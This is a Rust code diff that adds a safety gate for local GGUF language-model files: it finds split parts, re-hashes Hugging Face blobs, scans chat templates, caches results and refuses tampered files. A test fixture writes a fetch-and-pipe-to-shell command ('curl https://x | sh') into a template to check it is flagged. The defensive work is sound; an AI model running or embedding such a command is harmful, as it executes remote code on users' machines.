@@ -936,6 +936,360 @@ pub fn rehash_hf_blob(
     })
 }
 
+// ---------------------------------------------------------------------------------------
+// The whole check for one model
+// ---------------------------------------------------------------------------------------
+
+/// The files llama.cpp will read for the model at `first`: the file itself, or every part of
+/// a split model, named as llama.cpp names them (`<prefix>-00001-of-0000N.gguf`). Checking
+/// these, not just the file given, is what keeps a part from loading unchecked.
+pub fn model_files(first: &Path) -> Result<Vec<PathBuf>, Finding> {
+    let g = Gguf::open(first).map_err(|e| {
+        Finding::blocked(
+            "structure.unreadable",
+            "The file can't be read as a GGUF model.",
+            e.to_string(),
+        )
+    })?;
+    let count = g.u64("split.count").unwrap_or(1);
+    let no = g.u64("split.no").unwrap_or(0);
+    if count <= 1 {
+        return Ok(vec![first.to_path_buf()]);
+    }
+    let bad = |why: String| {
+        Finding::blocked(
+            "structure.split",
+            "The parts of the model don't match each other.",
+            why,
+        )
+    };
+    if count > 9_999 || no >= count {
+        return Err(bad(format!("part {no} of {count}")));
+    }
+    let name = first.to_string_lossy();
+    let suffix = format!("-{:05}-of-{:05}.gguf", no + 1, count);
+    let prefix = name
+        .strip_suffix(&suffix)
+        .filter(|p| !p.is_empty())
+        .ok_or_else(|| {
+            bad(format!(
+                "{name} isn't named like part {} of {count}",
+                no + 1
+            ))
+        })?;
+    Ok((1..=count)
+        .map(|i| PathBuf::from(format!("{prefix}-{i:05}-of-{count:05}.gguf")))
+        .collect())
+}
+
+/// The Hugging Face cache a file belongs to, when it resolves to one of its blobs
+/// (`<cache>/models--*/blobs/<64 hex>`).
+fn hf_cache_of_blob(path: &Path) -> Option<PathBuf> {
+    let target = std::fs::canonicalize(path).ok()?;
+    let name = target.file_name()?.to_str()?;
+    if name.len() != 64 || !name.chars().all(|c| c.is_ascii_hexdigit()) {
+        return None;
+    }
+    let blobs = target.parent()?;
+    let repo = blobs.parent()?;
+    let is_repo = repo
+        .file_name()
+        .and_then(|n| n.to_str())
+        .is_some_and(|n| n.starts_with("models--"));
+    (blobs.file_name()? == "blobs" && is_repo).then(|| repo.parent().map(Path::to_path_buf))?
+}
+
+/// What identifies a file's content for the stored result: a changed file has a different
+/// size, modification time or (on Unix) inode, and is checked again.
+#[derive(Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
+pub struct FileId {
+    pub path: PathBuf,
+    pub size: u64,
+    pub modified_ns: u128,
+    pub dev: u64,
+    pub ino: u64,
+}
+
+impl FileId {
+    pub fn of(path: &Path) -> std::io::Result<Self> {
+        let m = std::fs::metadata(path)?;
+        let modified_ns = m
+            .modified()?
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos())
+            .unwrap_or(0);
+        #[cfg(unix)]
+        let (dev, ino) = {
+            use std::os::unix::fs::MetadataExt;
+            (m.dev(), m.ino())
+        };
+        #[cfg(not(unix))]
+        let (dev, ino) = (0, 0);
+        Ok(Self {
+            path: path.to_path_buf(),
+            size: m.len(),
+            modified_ns,
+            dev,
+            ino,
+        })
+    }
+}
+
+/// Everything known about where a model came from, for the checks that need it.
+#[derive(Clone, Debug, Default)]
+pub struct Origin {
+    /// The Hugging Face cache the file is in, if it is (then it's re-hashed).
+    pub hf_cache: Option<PathBuf>,
+}
+
+/// Runs every check on the model at `first` (all its parts, the embedded chat template and
+/// the stored `.chat_template.jinja` next to it). A file that can't be read is Blocked,
+/// never passed.
+pub fn check_model(first: &Path, origin: &Origin, mut progress: impl FnMut(u64)) -> Report {
+    let mut findings = Vec::new();
+    let unreadable = |p: &Path, e: std::io::Error| {
+        Finding::blocked(
+            "structure.unreadable",
+            "The file can't be read.",
+            format!("{}: {e}", p.display()),
+        )
+    };
+    let parts = match model_files(first) {
+        Ok(p) => p,
+        Err(f) => return Report::new(vec![f]),
+    };
+    match structure_of_parts(&parts) {
+        Ok(f) => findings.extend(f),
+        Err(e) => findings.push(unreadable(first, e)),
+    }
+    // A file that is (or links to) a Hugging Face blob is always re-hashed, wherever the
+    // cache is configured: the file decides, not the environment. A file in the configured
+    // cache that isn't a blob link is reported too (a link elsewhere, a plain copy).
+    let mut done = 0u64;
+    for p in &parts {
+        let cache = hf_cache_of_blob(p).or_else(|| origin.hf_cache.clone());
+        if let Some(cache) = cache {
+            match rehash_hf_blob(p, &cache, |n| progress(done + n)) {
+                Ok(r) => findings.extend(r.finding()),
+                Err(e) => findings.push(unreadable(p, e)),
+            }
+        }
+        done += std::fs::metadata(p).map(|m| m.len()).unwrap_or(0);
+    }
+    if let Ok(g) = Gguf::open(first)
+        && let Some(t) = template_of(&g)
+    {
+        findings.extend(scan_template(t));
+    }
+    let side = crate::template::sidecar_path(first);
+    match std::fs::read_to_string(&side) {
+        Ok(t) => findings.extend(scan_template(&t)),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
+        Err(e) => findings.push(unreadable(&side, e)),
+    }
+    Report::new(findings)
+}
+
+// ---------------------------------------------------------------------------------------
+// The gate: stored results, and whether a model may load
+// ---------------------------------------------------------------------------------------
+
+/// What a stored result was computed from: every file of the model and the stored template
+/// next to it, and the rules. Any change means the model is checked again.
+#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
+pub struct CheckKey {
+    pub files: Vec<FileId>,
+    pub sidecar: Option<FileId>,
+    /// The Hugging Face cache the check knew of: a result from a run that saw another cache
+    /// isn't reused.
+    #[serde(default)]
+    pub hf_cache: Option<PathBuf>,
+    pub rules: u32,
+}
+
+impl CheckKey {
+    pub fn of(first: &Path, origin: &Origin) -> std::io::Result<Self> {
+        let parts = model_files(first).unwrap_or_else(|_| vec![first.to_path_buf()]);
+        let files = parts
+            .iter()
+            .map(|p| FileId::of(p))
+            .collect::<std::io::Result<_>>()?;
+        let side = crate::template::sidecar_path(first);
+        Ok(Self {
+            files,
+            sidecar: FileId::of(&side).ok(),
+            hf_cache: origin.hf_cache.clone(),
+            rules: RULES,
+        })
+    }
+}
+
+/// Results of earlier checks, in a JSON file the app chooses (`None`: kept in memory only).
+/// Re-hashing a large model takes seconds, so a model is hashed once, and again only when
+/// it changes.
+pub struct CheckCache {
+    path: Option<PathBuf>,
+    entries: std::sync::Mutex<Vec<(CheckKey, Report)>>,
+    /// Why the last save failed, for the caller to log (the model is then just checked
+    /// again next time).
+    save_error: std::sync::Mutex<Option<String>>,
+}
+
+impl CheckCache {
+    /// Most results kept; the oldest go first.
+    const MAX: usize = 256;
+
+    pub fn open(path: Option<PathBuf>) -> Self {
+        let entries = path
+            .as_ref()
+            .and_then(|p| std::fs::read(p).ok())
+            .and_then(|b| serde_json::from_slice(&b).ok())
+            .unwrap_or_default();
+        Self {
+            path,
+            entries: std::sync::Mutex::new(entries),
+            save_error: std::sync::Mutex::new(None),
+        }
+    }
+
+    /// Why the last save failed, once.
+    pub fn take_save_error(&self) -> Option<String> {
+        self.save_error
+            .lock()
+            .unwrap_or_else(|p| p.into_inner())
+            .take()
+    }
+
+    /// The stored result for `key`. Its state is worked out again from its findings, and a
+    /// result from other rules isn't used.
+    fn get(&self, key: &CheckKey) -> Option<Report> {
+        let e = self.entries.lock().unwrap_or_else(|p| p.into_inner());
+        e.iter()
+            .find(|(k, r)| k == key && r.rules == RULES)
+            .map(|(_, r)| Report::new(r.findings.clone()))
+    }
+
+    fn put(&self, key: CheckKey, report: Report) {
+        let mut e = self.entries.lock().unwrap_or_else(|p| p.into_inner());
+        // One result per model: drop older results for the same first file.
+        let first = key.files.first().map(|f| f.path.clone());
+        e.retain(|(k, _)| k.files.first().map(|f| &f.path) != first.as_ref());
+        e.push((key, report));
+        let n = e.len();
+        if n > Self::MAX {
+            e.drain(..n - Self::MAX);
+        }
+        if let Some(p) = &self.path
+            && let Ok(data) = serde_json::to_vec(&*e)
+        {
+            let mut tmp = p.as_os_str().to_owned();
+            tmp.push(".tmp");
+            if let Err(err) = std::fs::write(&tmp, data).and_then(|()| std::fs::rename(&tmp, p)) {
+                *self.save_error.lock().unwrap_or_else(|p| p.into_inner()) = Some(format!(
+                    "couldn't save model check results to {}: {err}",
+                    p.display()
+                ));
+            }
+        }
+    }
+}
+
+/// Whether a model may load, and why not.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum Verdict {
+    /// It may load. `report` may hold Warnings that were accepted (or, in the app until
+    /// #452, logged). The key is what was checked: call [`still_same`] with it right before
+    /// loading, so a file changed in between isn't loaded.
+    Load(Report, CheckKey),
+    /// It may not: Blocked, or Warnings that weren't accepted.
+    Refuse(Report),
+}
+
+impl Verdict {
+    pub fn report(&self) -> &Report {
+        match self {
+            Self::Load(r, _) | Self::Refuse(r) => r,
+        }
+    }
+}
+
+/// What the caller does with Warnings.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum OnWarnings {
+    /// Refuse the model (`dn` without `--accept-model-warnings`).
+    Refuse,
+    /// Load it; the person accepted them (`dn --accept-model-warnings`).
+    Accept,
+    /// Load it and let the caller log them: the app's temporary choice until #452.
+    Log,
+}
+
+/// The check before a model loads: the stored result if the model hasn't changed, else a
+/// fresh check (stored afterwards). A model whose files can't even be listed is refused.
+pub fn gate(
+    first: &Path,
+    origin: &Origin,
+    cache: &CheckCache,
+    on_warnings: OnWarnings,
+    progress: impl FnMut(u64),
+) -> Verdict {
+    let key = match CheckKey::of(first, origin) {
+        Ok(k) => k,
+        Err(e) => {
+            return Verdict::Refuse(Report::new(vec![Finding::blocked(
+                "structure.unreadable",
+                "The file can't be read.",
+                format!("{}: {e}", first.display()),
+            )]));
+        }
+    };
+    let report = match cache.get(&key) {
+        Some(r) => r,
+        None => {
+            let r = check_model(first, origin, progress);
+            // Store it only if the files didn't change while they were checked.
+            if CheckKey::of(first, origin).is_ok_and(|now| now == key) {
+                cache.put(key.clone(), r.clone());
+            }
+            r
+        }
+    };
+    match (report.state, on_warnings) {
+        (State::Checked, _) | (State::Warnings, OnWarnings::Accept | OnWarnings::Log) => {
+            Verdict::Load(report, key)
+        }
+        _ => Verdict::Refuse(report),
+    }
+}
+
+/// Whether the model's files are still the ones `key` was checked for. Called right before
+/// loading, so a file swapped after the check isn't loaded.
+pub fn still_same(first: &Path, origin: &Origin, key: &CheckKey) -> bool {
+    CheckKey::of(first, origin).is_ok_and(|now| &now == key)
+}
+
+/// The reasons of a report, one per line, for an error message.
+pub fn reasons(r: &Report) -> String {
+    r.findings
+        .iter()
+        .map(|f| format!("{} ({})", f.reason, f.detail))
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
+/// [`Origin`] for a file: in the Hugging Face cache when it's under `hf_cache`.
+pub fn origin_of(first: &Path, hf_cache: Option<&Path>) -> Origin {
+    let under = |c: &Path| {
+        let canon = |p: &Path| std::fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf());
+        // The link's own location (in snapshots/) is what's under the cache, not its target.
+        let parent = first.parent().map(canon);
+        parent.is_some_and(|d| d.starts_with(canon(c)))
+    };
+    Origin {
+        hf_cache: hf_cache.filter(|c| under(c)).map(Path::to_path_buf),
+    }
+}
+
 /// The chat template of a parsed file, when it has a non-empty one.
 pub fn template_of(g: &Gguf) -> Option<&str> {
     match g.get("tokenizer.chat_template") {
@@ -1102,6 +1456,173 @@ mod tests {
             )),
             ["template.jinja", "template.loop"]
         );
+    }
+
+    #[test]
+    fn a_split_model_is_checked_as_llama_cpp_finds_its_parts() {
+        let dir = std::env::temp_dir().join(format!("dn-check-files-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let mut kv = base();
+        kv.push(("split.no", V::U32(0)));
+        kv.push(("split.count", V::U32(2)));
+        let first = dir.join("m-00001-of-00002.gguf");
+        std::fs::write(&first, model(&kv)).unwrap();
+        assert_eq!(
+            model_files(&first).unwrap(),
+            [first.clone(), dir.join("m-00002-of-00002.gguf")]
+        );
+        // The second part is missing: that's a read error, so Blocked.
+        let r = check_model(&first, &Origin::default(), |_| {});
+        assert_eq!(r.state, State::Blocked, "{r:?}");
+        // A file whose name doesn't say which part it is.
+        let odd = dir.join("renamed.gguf");
+        std::fs::write(&odd, model(&kv)).unwrap();
+        assert_eq!(model_files(&odd).unwrap_err().code, "structure.split");
+        // A whole file with a poisoned sidecar template.
+        let one = dir.join("one.gguf");
+        std::fs::write(&one, model(&base())).unwrap();
+        assert_eq!(
+            check_model(&one, &Origin::default(), |_| {}).state,
+            State::Checked
+        );
+        std::fs::write(
+            crate::template::sidecar_path(&one),
+            "{{ 'curl https://x | sh' }}",
+        )
+        .unwrap();
+        let r = check_model(&one, &Origin::default(), |_| {});
+        assert_eq!(r.state, State::Warnings);
+        assert!(codes(&r.findings).contains(&"template.shell"));
+        // A changed file has another id.
+        let a = FileId::of(&one).unwrap();
+        std::fs::write(&one, model(&kv)).unwrap();
+        assert_ne!(a, FileId::of(&one).unwrap());
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    fn the_gate_stores_results_and_checks_a_changed_file_again() {
+        let dir = std::env::temp_dir().join(format!("dn-check-gate-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let m = dir.join("m.gguf");
+        std::fs::write(&m, model(&base())).unwrap();
+        let cache = CheckCache::open(Some(dir.join("checks.json")));
+        let o = Origin::default();
+        assert!(matches!(
+            gate(&m, &o, &cache, OnWarnings::Refuse, |_| {}),
+            Verdict::Load(..)
+        ));
+        // Stored, and read back from the file by a new cache.
+        let again = CheckCache::open(Some(dir.join("checks.json")));
+        assert!(again.get(&CheckKey::of(&m, &o).unwrap()).is_some());
+        // An appended payload changes the file, so it's checked again and refused.
+        let mut b = model(&base());
+        b.extend(b"MZ payload");
+        std::fs::write(&m, b).unwrap();
+        let v = gate(&m, &o, &cache, OnWarnings::Accept, |_| {});
+        assert!(
+            matches!(&v, Verdict::Refuse(r) if r.state == State::Blocked),
+            "{v:?}"
+        );
+        assert!(reasons(v.report()).contains("bytes after"));
+        // Warnings: refused, accepted, or loaded and logged.
+        std::fs::write(&m, model(&base())).unwrap();
+        std::fs::write(crate::template::sidecar_path(&m), "{{ 'see https://x' }}").unwrap();
+        assert!(matches!(
+            gate(&m, &o, &cache, OnWarnings::Refuse, |_| {}),
+            Verdict::Refuse(_)
+        ));
+        assert!(matches!(
+            gate(&m, &o, &cache, OnWarnings::Accept, |_| {}),
+            Verdict::Load(..)
+        ));
+        assert!(matches!(
+            gate(&m, &o, &cache, OnWarnings::Log, |_| {}),
+            Verdict::Load(..)
+        ));
+        // A file that can't be read is refused.
+        let gone = dir.join("missing.gguf");
+        assert!(matches!(
+            gate(&gone, &o, &cache, OnWarnings::Accept, |_| {}),
+            Verdict::Refuse(_)
+        ));
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn a_hugging_face_blob_is_re_hashed_whatever_cache_is_configured() {
+        let dir = std::env::temp_dir().join(format!("dn-check-blob-{}", std::process::id()));
+        let repo = dir.join("models--org--m");
+        let (blobs, snap) = (repo.join("blobs"), repo.join("snapshots").join("abc"));
+        std::fs::create_dir_all(&blobs).unwrap();
+        std::fs::create_dir_all(&snap).unwrap();
+        // A valid model whose blob name isn't its hash: changed in place.
+        std::fs::write(blobs.join("0".repeat(64)), model(&base())).unwrap();
+        let link = snap.join("m.gguf");
+        std::os::unix::fs::symlink(blobs.join("0".repeat(64)), &link).unwrap();
+        // No cache configured (another HF_HOME): the file itself says it's a blob.
+        let r = check_model(&link, &Origin::default(), |_| {});
+        assert_eq!(codes(&r.findings), ["rehash.mismatch"]);
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    fn a_stored_result_is_not_trusted_as_written() {
+        let dir = std::env::temp_dir().join(format!("dn-check-stored-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let mut bad = model(&base());
+        bad.extend(b"MZ payload");
+        let m = dir.join("m.gguf");
+        std::fs::write(&m, &bad).unwrap();
+        let file = dir.join("checks.json");
+        let o = Origin::default();
+        assert!(matches!(
+            gate(
+                &m,
+                &o,
+                &CheckCache::open(Some(file.clone())),
+                OnWarnings::Accept,
+                |_| {}
+            ),
+            Verdict::Refuse(_)
+        ));
+        // Someone edits the stored state to "checked"; the findings still say Blocked.
+        let edited = std::fs::read_to_string(&file)
+            .unwrap()
+            .replace("\"state\":\"blocked\"", "\"state\":\"checked\"");
+        std::fs::write(&file, edited).unwrap();
+        assert!(matches!(
+            gate(
+                &m,
+                &o,
+                &CheckCache::open(Some(file)),
+                OnWarnings::Accept,
+                |_| {}
+            ),
+            Verdict::Refuse(_)
+        ));
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    fn a_file_changed_after_the_check_is_noticed() {
+        let dir = std::env::temp_dir().join(format!("dn-check-swap-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let m = dir.join("m.gguf");
+        std::fs::write(&m, model(&base())).unwrap();
+        let o = Origin::default();
+        let Verdict::Load(_, key) =
+            gate(&m, &o, &CheckCache::open(None), OnWarnings::Refuse, |_| {})
+        else {
+            panic!("a clean model was refused");
+        };
+        assert!(still_same(&m, &o, &key));
+        let mut bad = model(&base());
+        bad.extend(b"MZ payload");
+        std::fs::write(&m, bad).unwrap();
+        assert!(!still_same(&m, &o, &key));
+        std::fs::remove_dir_all(&dir).unwrap();
     }
 
     #[test]
